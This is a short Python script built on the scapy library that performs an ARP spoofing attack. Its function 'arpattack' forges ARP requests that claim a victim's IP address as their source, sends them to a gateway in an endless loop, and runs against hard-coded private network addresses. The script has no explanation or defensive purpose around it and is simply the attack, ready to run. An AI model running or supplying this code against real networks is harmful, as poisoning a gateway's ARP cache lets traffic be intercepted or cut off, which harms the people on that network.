import os
from scapy.all import *

def arpattack(gateway, ip):
    pkt = ARP(psrc=ip, pdst=gateway, op=1)
    srloop(pkt)

if __name__ == '__main__':
    #arping(gateway)
    arpattack('192.168.170.254', '192.168.170.45')
